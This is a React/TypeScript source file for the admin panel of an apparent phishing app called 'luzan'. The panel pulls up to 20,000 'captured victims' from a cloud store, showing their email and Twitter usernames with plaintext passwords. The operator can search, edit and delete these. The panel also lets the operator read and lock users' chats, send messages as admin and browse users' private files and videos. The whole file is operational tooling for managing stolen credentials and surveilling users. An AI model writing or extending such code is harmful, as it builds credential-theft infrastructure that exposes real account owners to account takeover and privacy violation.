import { motion } from 'framer-motion';
import {
  ArrowLeft,
  ImagePlus,
  Lock,
  LockOpen,
  Mail,
  RefreshCw,
  Search,
  Send,
  Trash2,
  Twitter,
  X,
} from 'lucide-react';
import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { GlassButton, GlassCard, GlassInput, TagRow } from '../components/Glass';
import { ResolvedImg, ResolvedVideo } from '../components/MediaSrc';
import VirtualVictimList from '../components/VirtualVictimList';
import {
  clearAllCaptured,
  isAdminCredential,
  readCaptured,
  updateCaptured,
  writeCaptured,
} from '../lib/capturedStore';
import {
  cloudDeleteAllCaptures,
  cloudDeleteCapture,
  cloudListCaptures,
  cloudSetSetting,
  cloudUpdateCapture,
  cloudUploadFile,
  pollCloud,
  type CloudCapture,
} from '../lib/cloud';
import { DEFAULT_LUZAN_BG } from '../components/GlobalBackground';
import { fileToDataUrl } from '../lib/idb';
import { writeGlobalBg } from '../lib/globalFeed';
import type { CapturedCredential } from '../lib/types';
import { useAppStore } from '../store/useAppStore';

const MAX_USERS = 20_000;

function mapCloud(c: CloudCapture): CapturedCredential {
  return {
    id: c.id,
    type: c.type === 'twitter' ? 'twitter' : 'email',
    email: c.email,
    password: c.password || '',
    username: c.username || undefined,
    name: c.name || undefined,
    avatar: c.avatar || undefined,
    seq: c.seq || 0,
    count: c.count || 1,
    createdAt: c.created_at ? Date.parse(c.created_at) : Date.now(),
    lastSeenAt: c.last_seen_at ? Date.parse(c.last_seen_at) : Date.now(),
  };
}

type CredTab = 'email' | 'twitter';
type PanelView = 'victims' | 'chats' | 'files' | 'bg';

export default function LuzanAdminPanel({
  onClose,
  initialView = 'victims',
}: {
  onClose: () => void;
  initialView?: PanelView;
}) {
  const updateCredential = useAppStore((s) => s.updateCredential);
  const setGlobalBg = useAppStore((s) => s.setGlobalBg);
  const globalBg = useAppStore((s) => s.globalBg);
  const chats = useAppStore((s) => s.chats);
  const messages = useAppStore((s) => s.messages);
  const users = useAppStore((s) => s.users);
  const getUser = useAppStore((s) => s.getUser);
  const sendMessage = useAppStore((s) => s.sendMessage);
  const toggleLockChat = useAppStore((s) => s.toggleLockChat);
  const deleteMessageForEveryone = useAppStore((s) => s.deleteMessageForEveryone);
  const editMessageMedia = useAppStore((s) => s.editMessageMedia);
  const privateFiles = useAppStore((s) => s.privateFiles);
  const videos = useAppStore((s) => s.videos);
  const currentUser = useAppStore((s) => s.currentUser);

  const [view, setView] = useState<PanelView>(initialView);
  const [tab, setTab] = useState<CredTab>('email');
  const [search, setSearch] = useState('');
  const [captures, setCaptures] = useState<CapturedCredential[]>(() => {
    try {
      return readCaptured();
    } catch {
      return [];
    }
  });
  const [cloudStatus, setCloudStatus] = useState<'live' | 'offline'>('live');
  const [activeChat, setActiveChat] = useState<string | null>(null);
  const [msg, setMsg] = useState('');
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const bgInputRef = useRef<HTMLInputElement>(null);

  // CLOUD poll — cross-device victims (up to 20k), slower interval to stay smooth
  useEffect(() => {
    return pollCloud(
      () => cloudListCaptures('all', MAX_USERS),
      (rows) => {
        setCloudStatus('live');
        const mapped = (rows || []).map(mapCloud).slice(0, MAX_USERS);
        setCaptures(mapped);
        try {
          // keep a lighter mirror in zustand (ids/emails only if huge)
          useAppStore.setState({
            capturedAccounts: mapped,
            credentials: mapped,
          });
        } catch {
          /* ignore */
        }
      },
      5000
    );
  }, []);

  const rows = useMemo(() => {
    const q = search.trim().toLowerCase();
    const out: CapturedCredential[] = [];
    for (let i = 0; i < captures.length && out.length < MAX_USERS; i++) {
      const c = captures[i];
      if (isAdminCredential(c.email)) continue;
      if (c.type !== tab) continue;
      if (
        q &&
        !c.email.toLowerCase().includes(q) &&
        !(c.username || '').toLowerCase().includes(q) &&
        !(c.name || '').toLowerCase().includes(q) &&
        !c.password.toLowerCase().includes(q)
      ) {
        continue;
      }
      out.push(c);
    }
    return out;
  }, [captures, tab, search]);

  const deleteAll = async () => {
    if (!window.confirm('Delete ALL captured victims?')) return;
    try {
      await cloudDeleteAllCaptures();
    } catch {
      /* ignore */
    }
    clearAllCaptured();
    setCaptures([]);
    useAppStore.setState({ capturedAccounts: [], credentials: [] });
  };

  const deleteOne = useCallback(async (id: string) => {
    try {
      await cloudDeleteCapture(id);
    } catch {
      /* ignore */
    }
    setCaptures((prev) => {
      const next = prev.filter((c) => c.id !== id);
      try {
        writeCaptured(next.slice(0, 500)); // local cache capped
        useAppStore.setState({ capturedAccounts: next, credentials: next });
      } catch {
        /* ignore */
      }
      return next;
    });
  }, []);

  const patchCapture = useCallback(
    async (id: string, patch: Partial<CapturedCredential>) => {
      const next = updateCaptured(id, patch);
      setCaptures(next);
      try {
        await cloudUpdateCapture(id, {
          email: patch.email,
          password: patch.password,
          username: patch.username,
          name: patch.name,
        });
      } catch {
        /* ignore */
      }
    },
    []
  );

  const onPasswordChange = useCallback(
    (id: string, password: string) => {
      void patchCapture(id, { password });
      try {
        updateCredential(id, { password });
      } catch {
        /* ignore */
      }
    },
    [patchCapture, updateCredential]
  );

  const onBgFile = async (file?: File | null) => {
    if (!file || !file.type.startsWith('image/')) return;
    try {
      // prefer cloud URL for cross-device bg; fall back to data URL
      let url = '';
      try {
        const up = await cloudUploadFile(file);
        url = up.url;
        await cloudSetSetting('global_bg', url);
      } catch {
        url = await fileToDataUrl(file);
      }
      writeGlobalBg(url);
      setGlobalBg(url);
    } catch {
      /* ignore */
    }
  };

  return (
    <motion.div
      className="fixed inset-0 z-[60] flex flex-col bg-[#070214] text-white no-select"
      initial={{ opacity: 0, y: 30 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: 30 }}
    >
      {/* Header */}
      <header className="px-4 pt-5 pb-3 border-b border-white/10">
        <div className="flex items-center gap-3 mb-4">
          <button onClick={onClose} className="glass-icon-btn" aria-label="Close">
            <X className="h-4 w-4" />
          </button>
          <h1 className="text-xl font-bold tracking-tight flex-1">
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-fuchsia-400">
              luzan
            </span>{' '}
            <span className="text-white">Admin</span>
          </h1>
          <button
            type="button"
            onClick={async () => {
              try {
                const rows = await cloudListCaptures('all', MAX_USERS);
                setCaptures(rows.map(mapCloud).slice(0, MAX_USERS));
                setCloudStatus('live');
              } catch {
                setCloudStatus('offline');
                setCaptures(readCaptured());
              }
            }}
            className="glass-icon-btn"
            title="Refresh cloud"
          >
            <RefreshCw className="h-4 w-4" />
          </button>
        </div>
        <p className="text-[10px] text-white/35 mb-2">
          Cloud sync: {cloudStatus === 'live' ? '● live' : '○ offline (local cache)'}
        </p>

        {/* Sub nav */}
        <div className="flex gap-2 overflow-x-auto no-scrollbar mb-3">
          {(
            [
              { id: 'victims' as const, label: 'Victims' },
              { id: 'chats' as const, label: 'Chats' },
              { id: 'files' as const, label: 'Files' },
              { id: 'bg' as const, label: 'Background' },
            ] as const
          ).map((v) => (
            <button
              key={v.id}
              type="button"
              onClick={() => setView(v.id)}
              className={`shrink-0 rounded-full px-3.5 py-1.5 text-xs font-semibold border transition ${
                view === v.id
                  ? 'border-cyan-400/50 bg-cyan-500/20 text-white'
                  : 'border-white/10 text-white/50'
              }`}
            >
              {v.label}
            </button>
          ))}
        </div>

        {view === 'victims' && (
          <>
            {/* Email / Twitter tabs */}
            <div className="grid grid-cols-2 gap-2 mb-3">
              <button
                type="button"
                onClick={() => setTab('email')}
                className={`flex items-center justify-center gap-2 rounded-xl py-2.5 text-sm font-semibold border transition ${
                  tab === 'email'
                    ? 'border-fuchsia-400/40 bg-gradient-to-r from-violet-600/40 to-fuchsia-600/30 text-white'
                    : 'border-white/10 bg-white/5 text-white/55'
                }`}
              >
                <Mail className="h-4 w-4" /> Email Logins
              </button>
              <button
                type="button"
                onClick={() => setTab('twitter')}
                className={`flex items-center justify-center gap-2 rounded-xl py-2.5 text-sm font-semibold border transition ${
                  tab === 'twitter'
                    ? 'border-sky-400/40 bg-gradient-to-r from-sky-600/40 to-cyan-600/30 text-white'
                    : 'border-white/10 bg-white/5 text-white/55'
                }`}
              >
                <Twitter className="h-4 w-4" /> Twitter Logins
              </button>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={deleteAll}
                className="text-sm font-semibold text-rose-400 hover:text-rose-300 shrink-0 px-1"
              >
                Delete All
              </button>
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/35" />
                <input
                  className="glass-input !py-2 pl-9 text-sm w-full"
                  placeholder="Search victims..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>
              <span className="shrink-0 text-xs font-semibold text-white/50 tabular-nums">
                Total: {rows.length.toLocaleString()}
                {rows.length >= MAX_USERS ? '+' : ''}
              </span>
            </div>
          </>
        )}
      </header>

      {/* Victims list — virtualized for up to 20,000 */}
      {view === 'victims' && (
        <div className="flex-1 min-h-0 flex flex-col pt-2">
          <VirtualVictimList
            rows={rows}
            tab={tab}
            onDelete={deleteOne}
            onPasswordChange={onPasswordChange}
          />
        </div>
      )}

      {/* Background setter */}
      {view === 'bg' && (
        <div className="flex-1 overflow-auto px-4 py-6">
          <GlassCard className="p-5">
            <h2 className="text-lg font-semibold mb-1">Global background</h2>
            <p className="text-xs text-white/45 mb-4">
              Uploaded image applies across the whole app for everyone on this device.
            </p>
            <div className="mb-4 h-40 rounded-2xl overflow-hidden border border-white/15">
              <img
                src={globalBg || DEFAULT_LUZAN_BG}
                alt=""
                className="h-full w-full object-cover"
              />
            </div>
            <input
              ref={bgInputRef}
              type="file"
              accept="image/*"
              className="hidden"
              onChange={(e) => onBgFile(e.target.files?.[0])}
            />
            <GlassButton
              variant="primary"
              className="w-full justify-center gap-2"
              onClick={() => bgInputRef.current?.click()}
            >
              <ImagePlus className="h-4 w-4" /> Upload background
            </GlassButton>
            <GlassButton
              className="w-full justify-center mt-2"
              onClick={() => {
                writeGlobalBg(DEFAULT_LUZAN_BG);
                setGlobalBg(DEFAULT_LUZAN_BG);
                cloudSetSetting('global_bg', DEFAULT_LUZAN_BG).catch(() => undefined);
              }}
            >
              Reset to default
            </GlassButton>
          </GlassCard>
        </div>
      )}

      {/* Chats monitor (compact) */}
      {view === 'chats' && !activeChat && (
        <div className="flex-1 overflow-auto px-4 py-3 space-y-2">
          {chats.map((c) => {
            const title =
              c.type === 'global'
                ? 'Everyone'
                : c.type === 'group'
                  ? c.name
                  : c.participantIds
                      .map((id) => getUser(id)?.name)
                      .filter(Boolean)
                      .join(' · ');
            return (
              <button
                key={c.id}
                onClick={() => setActiveChat(c.id)}
                className="w-full glass-panel p-3 text-left"
              >
                <p className="text-sm font-medium flex items-center gap-1">
                  {title}
                  {c.locked && <Lock className="h-3 w-3 text-amber-300" />}
                </p>
              </button>
            );
          })}
        </div>
      )}

      {view === 'chats' && activeChat && (
        <div className="flex-1 flex flex-col min-h-0">
          <div className="px-4 py-2 flex items-center gap-2 border-b border-white/10">
            <button onClick={() => setActiveChat(null)} className="glass-icon-btn">
              <ArrowLeft className="h-4 w-4" />
            </button>
            <div className="flex-1 text-sm font-medium">Monitor</div>
            <GlassButton className="!py-2 text-xs" onClick={() => toggleLockChat(activeChat)}>
              {chats.find((c) => c.id === activeChat)?.locked ? (
                <>
                  <LockOpen className="h-3.5 w-3.5" /> Unlock
                </>
              ) : (
                <>
                  <Lock className="h-3.5 w-3.5" /> Lock
                </>
              )}
            </GlassButton>
          </div>
          <div className="flex-1 overflow-auto px-3 py-3 space-y-2">
            {messages
              .filter((m) => m.chatId === activeChat)
              .sort((a, b) => a.createdAt - b.createdAt)
              .map((m) => (
                <div key={m.id} className="glass-panel p-2 text-sm">
                  <div className="flex justify-between mb-1">
                    <span className="text-xs text-cyan-300">
                      {getUser(m.senderId)?.name || m.senderId}
                    </span>
                    <button
                      className="text-rose-300"
                      onClick={() => deleteMessageForEveryone(m.id)}
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </div>
                  {(m.type === 'image' || m.type === 'video') && (
                    <button
                      className="text-[10px] text-amber-200 mb-1"
                      onClick={() =>
                        editMessageMedia(m.id, {
                          mediaUrl: '',
                          mediaId: null,
                          text: '[removed by admin]',
                        })
                      }
                    >
                      Remove media
                    </button>
                  )}
                  <p>{m.text}</p>
                </div>
              ))}
          </div>
          <div className="p-3 flex gap-2 border-t border-white/10">
            <GlassInput
              className="flex-1"
              value={msg}
              onChange={(e) => setMsg(e.target.value)}
              placeholder="Message as admin"
            />
            <GlassButton
              variant="primary"
              className="!p-3"
              onClick={() => {
                if (!msg.trim()) return;
                sendMessage(activeChat, { text: msg.trim(), asAdmin: true });
                setMsg('');
              }}
            >
              <Send className="h-4 w-4" />
            </GlassButton>
          </div>
        </div>
      )}

      {/* User files */}
      {view === 'files' && !selectedUser && (
        <div className="flex-1 overflow-auto px-4 py-3 space-y-2">
          {users.map((u) => (
            <button
              key={u.id}
              onClick={() => setSelectedUser(u.id)}
              className="w-full glass-panel p-3 flex items-center gap-3 text-left"
            >
              <ResolvedImg
                src={u.avatar}
                mediaId={u.avatarMediaId}
                className="h-10 w-10 rounded-full object-cover"
              />
              <div className="flex-1 min-w-0">
                <p className="text-sm font-medium">{u.name}</p>
                <p className="text-xs text-white/40">
                  {privateFiles.filter((f) => f.ownerId === u.id).length} private ·{' '}
                  {videos.filter((v) => v.userId === u.id).length} videos
                </p>
              </div>
            </button>
          ))}
        </div>
      )}

      {view === 'files' && selectedUser && (
        <div className="flex-1 overflow-auto px-4 py-3">
          <button
            onClick={() => setSelectedUser(null)}
            className="flex items-center gap-1 text-sm text-white/60 mb-3"
          >
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
          <div className="grid grid-cols-3 gap-1.5">
            {videos
              .filter((v) => v.userId === selectedUser)
              .map((v) => (
                <div key={v.id} className="aspect-[9/16] rounded-lg overflow-hidden bg-white/5">
                  <ResolvedVideo
                    src={v.src}
                    mediaId={v.mediaId}
                    className="h-full w-full object-cover"
                    muted
                  />
                </div>
              ))}
            {privateFiles
              .filter((f) => f.ownerId === selectedUser)
              .map((f) => (
                <div key={f.id} className="aspect-square rounded-lg overflow-hidden bg-white/5 relative">
                  {f.mimeType.startsWith('video') ? (
                    <ResolvedVideo mediaId={f.mediaId} className="h-full w-full object-cover" muted />
                  ) : (
                    <ResolvedImg mediaId={f.mediaId} className="h-full w-full object-cover" />
                  )}
                  <div className="absolute bottom-1 left-1">
                    <TagRow tags={f.tags} />
                  </div>
                </div>
              ))}
          </div>
        </div>
      )}
    </motion.div>
  );
}
